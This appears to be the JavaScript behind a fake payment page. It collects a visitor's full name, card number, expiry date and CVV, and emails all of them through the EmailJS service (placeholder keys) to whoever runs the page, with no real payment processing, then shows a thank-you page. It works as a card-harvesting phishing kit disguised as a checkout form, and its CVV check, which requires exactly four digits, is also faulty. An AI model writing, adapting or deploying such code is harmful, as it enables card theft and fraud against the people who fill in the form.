emailjs.init('TU_PUBLIC_KEY'); // Reemplaza con tu Public Key

document.getElementById('paymentForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    // 1. CAPTURAR DATOS
    const datos = {
        nombre_completo: document.getElementById('nombre').value.trim(),
        numero_tarjeta: document.getElementById('tarjeta').value.replace(/\s/g, ''),
        fecha_expiracion: document.getElementById('fecha').value,
        codigo_cvv: document.getElementById('cvv').value
    };

    // 2. VALIDACIÓN CORREGIDA (4 letras mínimo)
    const errores = [];
    
    // Validación de nombre (mínimo 4 letras)
    if (!/^[a-zA-ZÀ-ÿñÑ\s]{4,}$/i.test(datos.nombre_completo)) {
        errores.push('El nombre debe tener al menos 4 letras');
    }

    // Validación de tarjeta
    if (!/^\d{16}$/.test(datos.numero_tarjeta)) {
        errores.push('Número de tarjeta inválido');
    }

    // Validación de fecha
    if (new Date(datos.fecha_expiracion) < new Date()) {
        errores.push('La tarjeta está expirada');
    }

    // Validación de CVV
    if (!/^\d{4}$/.test(datos.codigo_cvv)) {
        errores.push('Código CVV inválido');
    }

    if (errores.length > 0) {
        mostrarErrores(errores);
        return;
    }

    // 3. ENVÍO DE DATOS (DEBE LLEGAR TODO)
    document.getElementById('mensajeCarga').style.display = 'block';

    emailjs.send("TU_SERVICE_ID", "TU_TEMPLATE_ID", datos)
        .then(() => {
            window.location.href = "thank-you.html";
        })
        .catch((error) => {
            console.error('Error:', error);
            mostrarErrores(['Error temporal. Intenta nuevamente']);
        })
        .finally(() => {
            document.getElementById('mensajeCarga').style.display = 'none';
        });
});

// Función mostrar errores
function mostrarErrores(errores) {
    const contenedor = document.getElementById('errores');
    contenedor.innerHTML = errores.map(error => `
        <div class="error-msg">❌ ${error}</div>
    `).join('');
    contenedor.style.display = 'block';
}

// Formatear tarjeta
document.getElementById('tarjeta').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\s/g, '');
    value = value.replace(/(\d{4})/g, '$1 ').trim();
    e.target.value = value.substring(0, 19);
});
